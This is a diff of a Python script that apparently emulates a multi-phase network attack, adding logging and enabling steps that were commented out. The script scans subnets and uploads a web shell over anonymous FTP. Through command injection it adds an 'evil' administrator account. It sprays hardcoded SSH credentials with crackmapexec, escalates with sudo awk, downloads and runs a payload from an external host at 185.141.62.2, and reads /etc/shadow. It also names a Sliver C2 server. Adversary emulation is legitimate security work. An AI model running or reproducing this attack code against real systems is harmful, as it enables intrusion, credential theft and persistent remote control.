@@ -4,6 +4,7 @@ import requests
 import os
 import sys
 import paramiko
+import datetime
 
 
 def check_root():
@@ -11,7 +12,13 @@ def check_root():
 	if os.geteuid() != 0:
 		print('Please run the script as root (using sudo).')
 		sys.exit(1)
-		
+
+def log_event(message):
+	timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+	log_entry = f"{timestamp} - {message}\n"
+	with open("logfile.txt", "a") as logfile:
+		logfile.write(log_entry)
+
 def execute_ssh_commands(username, password, host, commands):
     # Create an SSH client
     client = paramiko.SSHClient()
@@ -36,22 +43,28 @@ def execute_ssh_commands(username, password, host, commands):
         client.close()
 
 def phaseOne():
+	log_event("Phase one attack initiating.")
 	# Define attack space 
 	subnet = "208.11.26.0/24"
 	target_ip = "208.11.26.100"
 	# Run fping against the subnet
 	print(f"Running fping against the subnet {subnet}")
+	log_event(f"Started fping against the target subnet {subnet}")
 	subprocess.run(["fping", "-g", subnet, "-a"])
 	# Wait for 3 minutes
 	print("Waiting for 3 minutes...")
-	#time.sleep(180)
+	log_event("Sleeping for 3 minutes.")
+	time.sleep(180)
 	# Run nmap with aggressive scanning and no ping against the target IP
 	print(f"Running nmap against the target IP {target_ip}")
+	log_event(f"Started NMAP -A against {target_ip}")
 	subprocess.run(["sudo", "nmap", "-A", "-Pn", target_ip])
 	# Wait for another 3 minutes
-	print("Waiting for another 3 minutes...")
-	#time.sleep(180)
+	print("Waiting for another 5 minutes...")
+	log_event("Sleeping for 5 minutes.")
+	time.sleep(300)
 	# Connect to FTP at the target IP using anonymous login
+	log_event(f"Exploiting FTP & Uploading command injection tool to {target_ip}")
 	print(f"Connecting to FTP at {target_ip} with anonymous login")
 	ftp_script = """
 	quote USER anonymous
@@ -64,14 +77,16 @@ def phaseOne():
 	subprocess.run(["ftp", "-n", target_ip], input=ftp_script, text=True)
 	print("FTP session ended")
 	# use curl to emulate adversary enumeration
-	whoami = "whoami"
+	whoami = "whoami%20/priv"
 	dir = "dir"
 	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
-	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Cdont%5Fforget%2Etxt"
+	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Clazy%5Fadmin%2Etxt"
 	#Add evil admin account with password123! as  the password.
 	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
 	# Add evil admin to administrators group
 	addAdminGroup = "net%20localgroup%20administrators%20evil%20%2Fadd"
+	systeminfo = "systeminfo"
+	log_event(f"Running curl command injections!")
 	# Set up URL Encoded curl requests
 	curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
 	curltwo = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={dir}"
@@ -79,6 +94,7 @@ def phaseOne():
 	curlfour = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}"
 	curlfive = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}"
 	curlsix = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}"
+	curlseven = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
 	# Execute requests
 	subprocess.run(curlone, shell=True, text=True)
 	subprocess.run(curltwo, shell=True, text=True)
@@ -87,21 +103,26 @@ def phaseOne():
 	subprocess.run(curlfive, shell=True, text=True)
 	subprocess.run(curlsix, shell=True, text=True)	
 	print("Phase One is Complete")
+	log_event("Phase One tasks finished.")
 	
 def phaseTwo():
+	log_event("Initiating Phase Two.")
 	subnet = "208.11.23.0/24"
 	target_ip = "208.11.23.201"
 	username = "ethan.reynolds"
 	password = "bubblewrap69"
 	# Run fping against the subnet
 	print(f"Running fping against the subnet {subnet}")
-	#subprocess.run(["fping", "-g", subnet, "-a"])
+	log_event(f"Launched fping against target subnet {subnet}")
+	subprocess.run(["fping", "-g", subnet, "-a"])
 	# Wait for 3 minutes
 	print("Waiting for 3 minutes...")
-	#time.sleep(180)
+	log_event("Sleeping for 3 minutes.")
+	time.sleep(180)
 	# Run Crackmapexec for ssh on the target subnet 
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
-	#subprocess.run(cme, shell=True, text=True)
+	log_event(f"Initiating Crackmapexec over ssh against target {subnet}")
+	subprocess.run(cme, shell=True, text=True)
 	# Initial SSH Connection, enumerate, and then perform privesc
 	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://185.141.62.2:8000/raichu -o /root/raichu\ && chmod +x /root/raichu && cat /etc/shadow\")}'"
 	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/raichu &\")}'"
@@ -262,6 +283,7 @@ def phaseFive():
 
 
 def main():
+	log_event("Script initiated")
 	# Ensure Sudo Usage
 	#check_root()
 	# Run phaseOne function
@@ -290,6 +312,7 @@ def main():
 	94.249.192.5	Sliver C2 Server
 	======================================
 	'''
+	log_event("Script completed")
 
 if __name__ == "__main__":
 	main()
